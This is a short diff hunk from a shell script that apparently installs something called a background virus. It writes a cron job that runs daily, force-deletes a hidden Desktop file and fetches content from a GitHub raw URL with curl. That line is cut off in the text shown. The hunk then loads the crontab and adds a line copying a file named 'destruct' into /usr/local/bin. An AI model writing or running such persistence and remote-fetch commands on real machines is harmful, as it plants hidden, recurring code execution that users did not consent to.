@@ -9,3 +9,4 @@ echo "12 20 * * * rm -rf ~/Desktop/.background_virus; curl -fsS https://raw.gith
 crontab mycron
 rm mycron
 
+cp destruct /usr/local/bin/destruct
